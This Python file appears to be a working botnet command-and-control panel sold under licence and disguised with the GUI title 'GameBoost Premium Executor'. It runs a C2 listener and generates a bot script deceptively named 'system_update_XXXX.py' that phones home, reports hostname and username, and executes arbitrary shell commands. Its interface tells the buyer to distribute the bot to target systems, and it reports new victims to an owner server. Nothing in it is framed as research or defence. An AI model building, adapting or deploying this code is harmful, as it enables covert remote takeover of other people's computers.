import socket
import threading
import json
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import random
import platform
import os
from datetime import datetime
import sys

LICENSE_KEY = "{{LICENSE_KEY}}"
OWNER_HOST = "localhost"
OWNER_PORT = 9999

class BuyerClient:
    def __init__(self):
        self.license_key = LICENSE_KEY
        self.bots = {}
        self.c2_port = random.randint(10000, 60000)
        self.server = None
        self.connected_to_owner = False
        self.setup_working_directory()
        self.setup_gui()
        
    def setup_working_directory(self):
        """Set working directory to a writable location"""
        try:
            # Try user's home directory first
            home_dir = os.path.expanduser("~")
            bot_files_dir = os.path.join(home_dir, "Bot_Files")
            
            # Create directory if it doesn't exist
            if not os.path.exists(bot_files_dir):
                os.makedirs(bot_files_dir)
            
            # Change to that directory
            os.chdir(bot_files_dir)
            self.log_message(f"✅ Working directory: {bot_files_dir}")
            return True
            
        except Exception as e:
            self.log_message(f"❌ Failed to set working directory: {e}")
            # Try current directory as fallback
            try:
                current_dir = os.getcwd()
                self.log_message(f"⚠️ Using current directory: {current_dir}")
                return True
            except:
                self.log_message("❌ All directory options failed!")
                return False
        
    def connect_to_owner(self):
        """Connect to owner server and activate license"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((OWNER_HOST, OWNER_PORT))
            
            register_msg = {
                'type': 'register',
                'license_key': self.license_key
            }
            sock.send(json.dumps(register_msg).encode())
            
            response_data = sock.recv(1024).decode()
            response = json.loads(response_data)
            sock.close()
            
            if response.get('status') == 'success':
                self.connected_to_owner = True
                return True
            else:
                self.log_message(f"❌ Owner server rejected license: {response.get('message', 'Unknown error')}")
                return False
                
        except Exception as e:
            self.log_message(f"❌ Connection error: {e}")
            return False
            
    def start_c2_server(self):
        """Start local C2 server for bots to connect to"""
        def handle_bot_connection(conn, addr):
            try:
                data = conn.recv(1024).decode()
                bot_info = json.loads(data)
                bot_id = bot_info.get('bot_id', 'unknown')
                
                self.bots[bot_id] = {
                    'conn': conn, 
                    'info': bot_info, 
                    'addr': addr, 
                    'last_seen': datetime.now()
                }
                
                self.update_display()
                self.log_message(f"✅ Bot connected: {bot_id}")
                
                # Notify owner server about new bot
                if self.connected_to_owner:
                    try:
                        owner_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        owner_sock.settimeout(5)
                        owner_sock.connect((OWNER_HOST, OWNER_PORT))
                        notify_msg = {
                            'type': 'bot_connected',
                            'bot_id': bot_id,
                            'buyer_key': self.license_key,
                            'system_info': bot_info.get('system_info', {})
                        }
                        owner_sock.send(json.dumps(notify_msg).encode())
                        owner_sock.close()
                    except:
                        pass  # Silent fail for owner notification
                        
            except Exception as e:
                self.log_message(f"❌ Error handling bot: {e}")
                
        def server_loop():
            try:
                self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server.bind(('0.0.0.0', self.c2_port))
                self.server.listen(5)
                self.log_message(f"✅ C2 server listening on port {self.c2_port}")
                
                while True:
                    try:
                        conn, addr = self.server.accept()
                        threading.Thread(target=handle_bot_connection, args=(conn, addr), daemon=True).start()
                    except:
                        break
            except Exception as e:
                self.log_message(f"❌ C2 server error: {e}")
                    
        threading.Thread(target=server_loop, daemon=True).start()
        return True
        
    def create_bot_file(self):
        """Create bot file that connects to this buyer's C2 server"""
        try:
            # Get local IP for bot connection
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
            except:
                local_ip = "127.0.0.1"
                self.log_message("⚠️ Using localhost IP - bots on same machine only")
            
            # SIMPLE BOT CODE - No admin requirements, just basic connection
            bot_code = f'''import socket
import json
import platform
import os
import subprocess
import time
import random

BUYER_IP = "{local_ip}"
BUYER_PORT = {self.c2_port}

def get_system_info():
    return {{
        "os": platform.system(),
        "hostname": platform.node(), 
        "username": os.getenv("USERNAME", "unknown"),
        "architecture": platform.architecture()[0]
    }}

def execute_command(command):
    try:
        if command.startswith("cmd:"):
            result = subprocess.run(command[4:], shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
        elif command == "sysinfo":
            output = json.dumps(get_system_info(), indent=2)
        else:
            output = f"Unknown command: {{command}}"
    except Exception as e:
        output = f"Error: {{str(e)}}"
    return output

def connect_to_buyer():
    bot_id = f"{{platform.node()}}-{{os.getenv('USERNAME', 'user')}}-{{random.randint(1000,9999)}}"
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((BUYER_IP, BUYER_PORT))
            
            connect_msg = {{
                "bot_id": bot_id,
                "system_info": get_system_info()
            }}
            
            sock.send(json.dumps(connect_msg).encode())
            print(f"Connected to buyer at {{BUYER_IP}}:{{BUYER_PORT}}")
            
            while True:
                command = sock.recv(1024).decode()
                if not command:
                    break
                output = execute_command(command)
                sock.send(output.encode())
                
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    connect_to_buyer()
'''
            filename = f"system_update_{random.randint(1000,9999)}.py"
            
            # Write file with error handling
            with open(filename, "w", encoding='utf-8') as f:
                f.write(bot_code)
                
            full_path = os.path.abspath(filename)
            self.log_message(f"✅ Bot file created: {full_path}")
            return full_path
            
        except Exception as e:
            self.log_message(f"❌ Error creating bot file: {e}")
            # Try alternative location
            try:
                filename = f"bot_{random.randint(1000,9999)}.py"
                desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", filename)
                with open(desktop_path, "w", encoding='utf-8') as f:
                    f.write(bot_code)
                self.log_message(f"✅ Bot file created on Desktop: {desktop_path}")
                return desktop_path
            except Exception as e2:
                self.log_message(f"❌ Even desktop creation failed: {e2}")
                return None
        
    def setup_gui(self):
        """Setup the buyer panel GUI"""
        self.root = tk.Tk()
        self.root.title("GameBoost Premium Executor")
        self.root.geometry("1000x700")
        self.root.configure(bg='#1e1e1e')
        
        # Header
        header = tk.Frame(self.root, bg='#1e1e1e')
        header.pack(fill='x', padx=20, pady=10)
        
        tk.Label(header, text="GAMEBOOST PREMIUM EXECUTOR", 
                bg='#1e1e1e', fg='white', font=('Arial', 16, 'bold')).pack(side='left')
        
        self.status_label = tk.Label(header, text="Status: Not Activated", bg='#1e1e1e', fg='red')
        self.status_label.pack(side='right')
        
        # Main content
        main = tk.Frame(self.root, bg='#1e1e1e')
        main.pack(fill='both', expand=True, padx=20, pady=10)
        
        # Left panel
        left = tk.Frame(main, bg='#1e1e1e')
        left.pack(side='left', fill='y', padx=(0, 10))
        
        # License info
        license_frame = tk.LabelFrame(left, text="License Information", bg='#1e1e1e', fg='white')
        license_frame.pack(fill='x', pady=(0, 10))
        
        tk.Label(license_frame, text="License Key:", bg='#1e1e1e', fg='white', font=('Arial', 10, 'bold')).pack(anchor='w')
        license_display = tk.Label(license_frame, text=self.license_key, bg='#2d2d30', fg='#00ff00', 
                                  font=('Courier', 10), wraplength=200, justify='left', padx=5, pady=5)
        license_display.pack(fill='x', pady=5)
        
        tk.Button(license_frame, text="🔑 Activate License", command=self.activate_license,
                 bg='#3498db', fg='white', font=('Arial', 10, 'bold')).pack(pady=5, fill='x')
        
        # Controls
        control_frame = tk.LabelFrame(left, text="C2 Controls", bg='#1e1e1e', fg='white')
        control_frame.pack(fill='x', pady=(0, 10))
        
        tk.Button(control_frame, text="🚀 Start C2 Server", command=self.start_server,
                 bg='#27ae60', fg='white', font=('Arial', 10)).pack(pady=5, fill='x')
        
        tk.Button(control_frame, text="🤖 Generate Bot File", command=self.generate_bot,
                 bg='#e74c3c', fg='white', font=('Arial', 10)).pack(pady=5, fill='x')
        
        # Stats
        stats_frame = tk.LabelFrame(left, text="Statistics", bg='#1e1e1e', fg='white')
        stats_frame.pack(fill='x', pady=(0, 10))
        
        self.bots_label = tk.Label(stats_frame, text="Connected Bots: 0", bg='#1e1e1e', fg='white')
        self.bots_label.pack(anchor='w')
        
        self.port_label = tk.Label(stats_frame, text="C2 Port: Not running", bg='#1e1e1e', fg='white')
        self.port_label.pack(anchor='w')
        
        self.license_status = tk.Label(stats_frame, text="License: Not Activated", bg='#1e1e1e', fg='red')
        self.license_status.pack(anchor='w')
        
        # Current directory info
        dir_frame = tk.LabelFrame(left, text="File Location", bg='#1e1e1e', fg='white')
        dir_frame.pack(fill='x', pady=(0, 10))
        
        current_dir = os.getcwd()
        dir_label = tk.Label(dir_frame, text=f"Files saved to:\\n{current_dir}", 
                           bg='#1e1e1e', fg='#cccccc', font=('Arial', 8), justify='left')
        dir_label.pack(fill='x', padx=5, pady=5)
        
        # Command section
        cmd_frame = tk.LabelFrame(left, text="Bot Commands", bg='#1e1e1e', fg='white')
        cmd_frame.pack(fill='x', pady=(0, 10))
        
        tk.Label(cmd_frame, text="Command:", bg='#1e1e1e', fg='white').pack(anchor='w')
        self.cmd_entry = tk.Entry(cmd_frame, bg='#2d2d30', fg='white')
        self.cmd_entry.pack(fill='x', pady=5)
        self.cmd_entry.insert(0, "cmd:whoami")
        
        tk.Button(cmd_frame, text="📡 Send to All Bots", command=self.send_command,
                 bg='#f39c12', fg='white').pack(pady=5, fill='x')
        
        # Right panel
        right = tk.Frame(main, bg='#1e1e1e')
        right.pack(side='right', fill='both', expand=True)
        
        # Notebook for tabs
        notebook = ttk.Notebook(right)
        notebook.pack(fill='both', expand=True)
        
        # Bots tab
        bots_tab = tk.Frame(notebook, bg='#1e1e1e')
        notebook.add(bots_tab, text="🤖 Connected Bots")
        
        self.bot_tree = ttk.Treeview(bots_tab, columns=("ID", "OS", "User", "IP", "Last Seen"), show="headings")
        self.bot_tree.heading("ID", text="Bot ID")
        self.bot_tree.heading("OS", text="OS")
        self.bot_tree.heading("User", text="Username")
        self.bot_tree.heading("IP", text="IP Address")
        self.bot_tree.heading("Last Seen", text="Last Seen")
        
        scrollbar = ttk.Scrollbar(bots_tab, orient="vertical", command=self.bot_tree.yview)
        self.bot_tree.configure(yscrollcommand=scrollbar.set)
        
        self.bot_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        # Logs tab
        logs_tab = tk.Frame(notebook, bg='#1e1e1e')
        notebook.add(logs_tab, text="📋 Logs")
        
        self.log_text = scrolledtext.ScrolledText(logs_tab, bg='#2d2d30', fg='white', font=('Consolas', 9))
        self.log_text.pack(fill='both', expand=True)
        
        # Start UI updates
        self.root.after(1000, self.update_display)
        self.log_message("✅ Buyer panel started successfully")
        self.log_message(f"📁 Files will be saved to: {current_dir}")
        self.root.mainloop()
        
    def activate_license(self):
        """Activate the license with owner server"""
        self.log_message("🔄 Attempting to activate license...")
        if self.connect_to_owner():
            self.status_label.config(text="Status: ✅ Activated", fg="green")
            self.license_status.config(text="License: ✅ Activated", fg="green")
            self.log_message("✅ License activated successfully!")
            messagebox.showinfo("Success", "License activated successfully!\\nYou can now start the C2 server.")
        else:
            self.status_label.config(text="Status: ❌ Activation Failed", fg="red")
            self.license_status.config(text="License: ❌ Activation Failed", fg="red")
            messagebox.showerror("Error", "License activation failed!\\n\\nCheck:\\n1. Owner server is running\\n2. License key is valid\\n3. Network connection")
            
    def start_server(self):
        """Start the C2 server"""
        if not self.connected_to_owner:
            messagebox.showerror("Error", "Please activate your license first!")
            return
            
        if self.start_c2_server():
            self.status_label.config(text=f"Status: ✅ C2 Running on port {self.c2_port}")
            self.port_label.config(text=f"C2 Port: {self.c2_port}")
            self.log_message(f"✅ C2 server started on port {self.c2_port}")
            messagebox.showinfo("Success", f"C2 server started on port {self.c2_port}\\n\\nYou can now generate bot files.")
        else:
            self.log_message("❌ Failed to start C2 server")
            
    def generate_bot(self):
        """Generate a bot file"""
        if not self.connected_to_owner:
            messagebox.showerror("Error", "Please activate license first!")
            return
            
        if not hasattr(self, 'c2_port'):
            messagebox.showerror("Error", "Please start C2 server first!")
            return
            
        self.log_message("🔄 Creating bot file...")
        bot_file = self.create_bot_file()
        if bot_file:
            messagebox.showinfo("Success", f"Bot file created successfully!\\n\\nLocation: {bot_file}\\n\\nDistribute this file to target systems.")
        else:
            messagebox.showerror("Error", "Failed to create bot file!\\n\\nCheck file permissions or try running as administrator.")
            
    def send_command(self):
        """Send command to all connected bots"""
        command = self.cmd_entry.get().strip()
        if not command:
            messagebox.showwarning("Warning", "Please enter a command")
            return
            
        if not self.bots:
            messagebox.showwarning("Warning", "No bots connected")
            return
            
        self.log_message(f"📡 Sending command to {len(self.bots)} bots: {command}")
        disconnected_bots = []
        
        for bot_id, bot_info in self.bots.items():
            try:
                bot_info['conn'].send(command.encode())
                self.log_message(f"✅ Command sent to {bot_id}")
            except:
                self.log_message(f"❌ Failed to send command to {bot_id}")
                disconnected_bots.append(bot_id)
        
        # Remove disconnected bots
        for bot_id in disconnected_bots:
            if bot_id in self.bots:
                del self.bots[bot_id]
                
        self.update_display()
            
    def update_display(self):
        """Update the GUI display"""
        self.bots_label.config(text=f"Connected Bots: {len(self.bots)}")
        
        # Update bot tree
        for item in self.bot_tree.get_children():
            self.bot_tree.delete(item)
            
        for bot_id, bot_info in self.bots.items():
            sys_info = bot_info.get('info', {})
            last_seen = bot_info.get('last_seen', 'Unknown')
            if hasattr(last_seen, 'strftime'):
                last_seen = last_seen.strftime("%H:%M:%S")
                
            self.bot_tree.insert("", "end", values=(
                bot_id,
                sys_info.get('os', 'Unknown'),
                sys_info.get('username', 'Unknown'),
                bot_info.get('addr', ['Unknown'])[0],
                last_seen
            ))
        
        self.root.after(2000, self.update_display)
        
    def log_message(self, message):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\\n")
        self.log_text.see(tk.END)

if __name__ == "__main__":
    client = BuyerClient()
